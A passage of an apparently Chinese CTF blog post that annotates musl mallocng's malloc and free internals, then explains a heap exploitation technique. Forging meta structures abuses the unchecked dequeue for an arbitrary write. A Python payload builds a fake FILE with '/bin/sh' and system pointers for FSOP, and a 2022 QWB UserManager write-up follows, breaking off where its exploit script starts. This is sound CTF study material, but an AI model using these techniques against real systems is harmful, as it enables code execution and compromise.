<h3 id="emframe"><a href="#emframe" class="headerlink" title="emframe"></a>emframe</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">enframe</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> idx, <span class="type">size_t</span> n, <span class="type">int</span> ctr)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 获取 chunk 大小</span></span><br><span class="line">	<span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="comment">// 计算 chunk 多余空间</span></span><br><span class="line">	<span class="type">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line">	<span class="comment">// p 指向 chunk 的 data 起始位置</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *end = p+stride-IB;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line">	<span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check */</span></span><br><span class="line">	<span class="comment">// p[-3] = chunk_idx</span></span><br><span class="line">	<span class="comment">// *(uint16_t *)(p-2) = chunk_offset</span></span><br><span class="line">	<span class="comment">// 取 chunk 的 offset，一般为 0</span></span><br><span class="line">	<span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">	assert(!p[<span class="number">-4</span>]);</span><br><span class="line">	<span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line">		<span class="type">size_t</span> m = slack;</span><br><span class="line">		m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">		off &amp;= m;</span><br><span class="line">		<span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">		assert(off &lt;= slack);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (off) &#123;</span><br><span class="line">		<span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line">		<span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">		*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">		p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">		p += UNIT*off;</span><br><span class="line">		<span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line">		<span class="comment">// byte, so make one.</span></span><br><span class="line">		p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 设置 offset 和 idx</span></span><br><span class="line">	*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="type">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">	p[<span class="number">-3</span>] = idx;</span><br><span class="line">	<span class="comment">// 设置 reserved</span></span><br><span class="line">	set_size(p, end, n);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>以下为一般情况的流程，省略了特殊情况</p>
<ol>
<li><strong>检查申请的 size</strong><ul>
<li>如果 size 达到需要 mmap 的阈值<ol>
<li>直接调用 mmap，返回的地址作为 group</li>
<li>获取并初始化 meta<ul>
<li>last_idx = 0，只有一个 chunk，因此它不会再 ctx.active 中</li>
<li>sizeclass = 63</li>
<li>maplen = (size + 4 + 0x10 + 4095) / 4096</li>
<li>avail_mask = freed_mask = 0</li>
<li>ctx.mmap_counter++</li>
</ul>
</li>
<li>进入 success</li>
</ol>
</li>
<li>没有则调用 <code>size_to_class</code> 将 size 计算为对应的 sc（sizeclass）</li>
</ul>
</li>
<li><strong>获取对应的 meta</strong><ol>
<li>取 sc 对应大小的可分配的 meta（ctx.active[sc])</li>
<li>若不存在满足下列所有条件会取稍大一点的 meta<ul>
<li>4&lt;= sc &lt;32</li>
<li>sc != 6</li>
<li>sc 为偶数</li>
<li>对应大小的所有 chunk 数量为 0（没有对应大小的 meta）</li>
</ul>
</li>
</ol>
</li>
<li><strong>获取 chunk 的 idx</strong><ol>
<li>取 meta 的第一个 avail_chunk<ul>
<li>若 avail_chunk 存在<ol>
<li>将 avail_mask 上对应的位置置零</li>
<li>进入 success</li>
</ol>
</li>
</ul>
</li>
<li>进入 <code>alloc_slot</code> 进行进一步申请<ol>
<li>调用 <code>try_avail</code> 尝试 ctx.active[sc] 链表中的所有 meta<ol>
<li>检查第一个 meta 的 freed_mask<ul>
<li>若 freed_mask 为 0，会调用 **<code>dequeue</code>**，将其移除 ctx.active[sc]</li>
<li>因为第一个 meta 没有 unuse_chunk</li>
</ul>
</li>
<li>将下一个 meta 切换为第一个 meta（ctx.active[sc] = m-&gt;next)</li>
<li>将 meta 的 freed_mask 转为 avail_mask</li>
<li>取 meta 的第一个 avail_chunk，将 avail_mask 上对应的位置置零</li>
<li>返回第一个 avail_chunk 对应的 avail_mask 位置</li>
<li><strong>注</strong>：下一个 meta 可能是它自己（循环），如果没有 unused_mask，最终会返回 0</li>
</ol>
</li>
<li>如果 <code>try_avail</code> 返回 0，会调用 <code>alloc_group</code> 申请一个新的 group<ol>
<li>先调用 <code>alloc_meta</code> 申请一个 meta，优先取 freed_meta 再从 meta_area 中取新的</li>
<li>新的 group 一般取更大的 chunk 作为整个 group，是一个递归过程</li>
<li>meta 的 avail_mask 减一，即使用第一个 chunk</li>
<li>调用 <code>queue</code> 将 meta 放入 ctx.active[sc]</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li><strong>进入 success</strong><ul>
<li>调用 <code>enframe</code> 对 chunk 初始化</li>
<li>(unsigned char*) p[-3] = idx</li>
<li>*(uint16_t) (p - 2) = offset</li>
<li>设置 reserved</li>
</ul>
</li>
</ol>
<h3 id="总结简单版"><a href="#总结简单版" class="headerlink" title="总结简单版"></a>总结简单版</h3><p><strong>分配 chunk 顺序</strong></p>
<ol>
<li>ctx.active[sc] -&gt; avail_mask<ul>
<li>malloc_context.active 对应大小的 meta 中的 avail_chunk</li>
</ul>
</li>
<li>ctx.active[sc] -&gt; next -&gt; freed_mask<ul>
<li>malloc_context.active 对应大小的 meta 的 下一个 meta 中的 freed_chunk</li>
<li>如果 ctx.active[sc] 的 chunk 都是 inuse，则会调用 **<code>dequeue</code>**，将其移出 active 和链表</li>
<li>先把 freed_mask 转为 avail_mask，然后将 ctx.active[sc] 设为该 meta</li>
</ul>
</li>
<li>ctx.active[sc] -&gt; freed_mask<ul>
<li>malloc_context.active 对应大小的 meta 中的 freed_chunk</li>
</ul>
</li>
<li>new_meta -&gt; avail_mask<ul>
<li>申请一个新的 meta，取其 avail_chunk</li>
</ul>
</li>
</ol>
<h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/free.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">	<span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">	<span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">	<span class="comment">// 检查 reserved</span></span><br><span class="line">	get_nominal_size(p, end);</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">	<span class="comment">// idx 和 reserved 置 0xff，offset 置 0</span></span><br><span class="line">	((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">	<span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line">	<span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">	*(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line">	<span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">		<span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">		assert(!(mask&amp;self));</span><br><span class="line">		<span class="comment">// 如果没有 freed_chunk 或者都是 unuse_chunk，则跳出循环</span></span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果其他 chunk 都不是 freed_chunk 或者都是 unuse_chunk 则会 进入 nontrivial_free</p>
<h3 id="nontrivial-free"><a href="#nontrivial-free" class="headerlink" title="nontrivial_free"></a>nontrivial_free</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/free.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 一般情况，只要所有 chunk 都是 unuse，就会 free meta 和 group</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="comment">// 将下一个 meta 的 freed_chunk 转为 avail_chunk</span></span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		<span class="comment">// 如果 meta 不在 active 里，则放入 actvie 中</span></span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// g-&gt;freed_mask = g-&gt;free_mask &amp; self</span></span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>所有 chunk 都是 unuse_chunk<ol>
<li>将该 meta 从 active 和链表中移除</li>
<li>将链表的下一个 meta 的 freed_chunk 转为 avail_chunk</li>
<li>free 该 meta 和 group</li>
</ol>
</li>
<li>没有 freed_chunk<ol>
<li>将该 meta 插入 active 的链表尾部</li>
</ol>
</li>
</ul>
<h3 id="free-group"><a href="#free-group" class="headerlink" title="free_group"></a>free_group</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/free.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">		step_seq();</span><br><span class="line">		record_seq(sc);</span><br><span class="line">		mi.base = g-&gt;mem;</span><br><span class="line">		mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">		<span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">		g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">		mi = nontrivial_free(m, idx);</span><br><span class="line">	&#125;</span><br><span class="line">	free_meta(g);</span><br><span class="line">	<span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结一下-1"><a href="#总结一下-1" class="headerlink" title="总结一下"></a>总结一下</h3><ol>
<li>获取 chunk 的 meta、idx、sc</li>
<li>检查 reserved</li>
<li>idx 和 reserved 置为 0xff，offset 置零</li>
<li>检查 avail_mask 和 freed_mask<ul>
<li>若存在 freed_chunk 且有其他的 inuse_chunk<ul>
<li>将 freed_mask 上该 chunk 对应的位置设为 1</li>
<li>结束 <code>free</code> 函数</li>
</ul>
</li>
<li>否则进入下一步</li>
</ul>
</li>
<li>调用 <code>nontrivial_free</code> 函数做进一步处理<ol>
<li>如果所有 chunk 都是 unuse_chunk<ul>
<li>如果 meta 的 next 存在，调用 <strong><code>dequeue</code></strong> 将 meta 从 ctx.active[sc] 中移出</li>
<li>free 掉 meta 和 group</li>
<li>结束 <code>free</code> 函数</li>
</ul>
</li>
<li>如果其他 chunk 都是 inuse_chunk 且 meta 不在 ctx.artive[sc] 中<ul>
<li>调用 <code>queue</code> 将 meta 放入 ctx.active[sc]</li>
</ul>
</li>
<li>将 freed_mask 上该 chunk 对应的位置设为 1</li>
</ol>
</li>
</ol>
<h2 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h2><h3 id="dequeue-1"><a href="#dequeue-1" class="headerlink" title="dequeue"></a>dequeue</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>几乎没有任何检查，如果能够伪造 meta，可以任意地址写</p>
<p><strong>调用途径</strong></p>
<ul>
<li>malloc -&gt; try_avail -&gt; dequeue</li>
<li>free -&gt; nontrivial_free -&gt; dequeue</li>
</ul>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ol>
<li>泄露一些重要信息<ul>
<li>大部分都可以从 malloc_context 中获取</li>
<li>libc 基址</li>
<li>secret</li>
</ul>
</li>
<li>伪造 meta_area、area、group、chunk<ul>
<li>下面是一些伪造的硬性要求或者建议</li>
<li>meta_area<ul>
<li>因为 get_meta 时会检查 secret 防止伪造，而检查时取 meta_area 地址是取 area 所在页的地址，因此伪造的 meta_area 地址后 12 位都要为 0，一般通过 mmap 伪造</li>
<li>check == malloc_context.secret</li>
</ul>
</li>
<li>area<ul>
<li>prev，next 改成想写的位置</li>
<li>mem == fake_group</li>
<li>last_idx == 0，一般只需要伪造一个 chunk，这样 free fake_chunk 时直接能进入 <code>nontrivial_free</code></li>
<li>avail_mask，freed_mask 全为 0 即可（因为只有一个将要 free 的 fake_chunk）</li>
<li>sc &lt; 48</li>
<li>freeable == 1</li>
<li>maplen != 0，否则在 <code>free_group</code> 会进行递归 free，随便取个值就行</li>
</ul>
</li>
<li>group<ul>
<li>meta == fake_meta</li>
<li>active_idx == 0</li>
</ul>
</li>
<li>chunk<ul>
<li>一般是 fake_fike 或者其他垃圾数据</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>下面的例子是将 ofl_head 指向 fake_chunk（fake_file），exit 时就可以导致 FSOP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sc = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = p64(addr_fake_chunk) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(addr_ofl_head) <span class="comment"># next </span></span><br><span class="line">fake_meta += p64(addr_fake_group) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># avail &amp; freed mask</span></span><br><span class="line">fake_meta += p64(maplen &lt;&lt; <span class="number">12</span> | sc &lt;&lt; <span class="number">6</span> | freeable &lt;&lt; <span class="number">5</span> | last_idx)</span><br><span class="line"></span><br><span class="line">active_idx = <span class="number">0</span></span><br><span class="line">fake_group = p64(addr_fake_meta)</span><br><span class="line">fake_group += p64(active_idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_file</span></span><br><span class="line">fake_chunk = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">fake_chunk += p64(addr_system) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(secret) <span class="comment"># check</span></span><br><span class="line">fake_meta_area += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta_area += p64(<span class="number">1</span>) <span class="comment"># nsolts</span></span><br></pre></td></tr></table></figure>

<h2 id="2022-qwb-UserManager"><a href="#2022-qwb-UserManager" class="headerlink" title="2022 qwb UserManager"></a>2022 qwb UserManager</h2><p>这里只要会堆风水就行，不需要伪造就可以任意地址写一次</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">insert</span><span class="params">(User *newUser, User *users)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span> ( users )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// UAF</span></span><br><span class="line">    	<span class="keyword">if</span> ( newUser-&gt;id == users-&gt;id )</span><br><span class="line">		&#123;</span><br><span class="line">			newUser-&gt;flag = users-&gt;flag;</span><br><span class="line">			newUser-&gt;leftUser = users-&gt;leftUser;</span><br><span class="line">			newUser-&gt;rightUser = users-&gt;rightUser;</span><br><span class="line">			newUser-&gt;parentUser = users-&gt;parentUser;</span><br><span class="line">			<span class="keyword">if</span> ( users-&gt;leftUser )</span><br><span class="line">				users-&gt;leftUser-&gt;parentUser = newUser;</span><br><span class="line">			<span class="keyword">if</span> ( users-&gt;rightUser )</span><br><span class="line">				users-&gt;rightUser-&gt;parentUser = newUser;</span><br><span class="line">		<span class="keyword">if</span> ( users-&gt;parentUser != (User *)<span class="number">0xDEADBEEF</span>LL )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> ( users == users-&gt;parentUser-&gt;leftUser )</span><br><span class="line">				users-&gt;parentUser-&gt;leftUser = newUser;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				users-&gt;parentUser-&gt;rightUser = newUser;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">free</span>(users-&gt;name);</span><br><span class="line">		<span class="built_in">free</span>(users);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在添加 user 的时候，如果有 id 相同的 user，会把原来的 user 释放掉，但是 users 会指向原来的 user，造成 UAF</p>
<ol>
<li>先泄露出 libc 和 elf 地址</li>
<li>上面的第 13 行可以任意地址写一次，把 ofl_head 修改到可控位置</li>
<li>伪造 fake_file</li>
<li>最后 exit 进行 FSOP</li>
</ol>
<p>最后写 fake_file 的时候要多次堆风水</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 